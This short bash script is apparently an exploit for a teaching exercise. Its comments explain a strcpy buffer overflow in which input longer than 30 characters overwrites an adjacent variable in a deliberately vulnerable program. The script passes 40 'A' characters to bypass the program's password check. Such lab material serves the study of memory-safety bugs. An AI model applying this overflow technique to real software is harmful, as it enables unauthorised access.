#!/bin/bash
#
# Author: Antonio VÃ¡zquez Blanco
# Email: antoniovazquezblanco@gmail.com
#
# Description:
# When more than 30 characters as first argument to the program a buffer overflow occurs.
# If more than 30 characters are passed as the first argument strcpy copies more than 30 characters into the "pass" variable which is overflowded and the next variable in memory is overwritten, which in our case is res.
# As now res is not 0 it prints "Access granted!"
# 

if [ x$1 == x ]
then
	echo "Please provide a path to the executable:"
	echo " ./exploit exploitme.exe"
	exit
fi
	
./$1 $(perl -e "printf 'A'x40;")
